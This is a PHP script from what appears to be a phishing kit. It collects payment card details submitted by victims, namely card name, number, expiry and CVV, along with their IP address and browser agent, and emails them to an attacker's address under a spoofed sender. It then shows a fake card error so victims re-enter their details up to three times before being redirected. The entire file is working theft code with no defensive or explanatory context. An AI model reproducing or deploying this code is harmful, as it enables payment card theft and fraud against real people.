<?php

session_start();
error_reporting(0);
	if(isset($_SESSION['access']) && $_SESSION['access'] == false){
		header("location:https://www.google.com");
	}
	
include('email.php');
$user = $_SESSION['user'];

$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date.", Time : ".$time);

$message  = "#----------------+ [ HEX REZ ] +----------------#\n";
$message .= "#---------------++==[ LOGIN ]==++-------------#\n";
$message .= "Moula CC 		: ".$_POST['cn']."\n";
$message .= "CC	: ".$_POST['cr']."\n";
$message .= "Exp 		: ".$_POST['cx']."\n";
$message .= "CCV	: ".$_POST['cv']."\n";
$message .= "#---------------++==============++-------------#\n";
$message .= "Client IP	: ".$_SESSION['ip']."\n";
$message .= "Agent		  : ".$_SERVER ['HTTP_USER_AGENT']."\n";
$message .= "Date		    : ".$date."\n";
$message .= "whatismyip	: http://ip-score.com/checkip/".$_SESSION['ip']."\n";
$message .= "#----------------+ [ HEX REZ ] +----------------#\n";
$subject  = "HEX CC INFOS Fr0m [ $user ]";
$headers  = "From:HEXO <resultats@tsbdumbs.com>\r\n";
mail($fiftyme,$subject,$message,$headers);
if($_SESSION['try']== '3'){
	header("location:success.php");
}
else{
header("location:SimplePay.php?error=errorcard");
$_SESSION['try'] = $_SESSION['try'] + 1 ;
}
?>
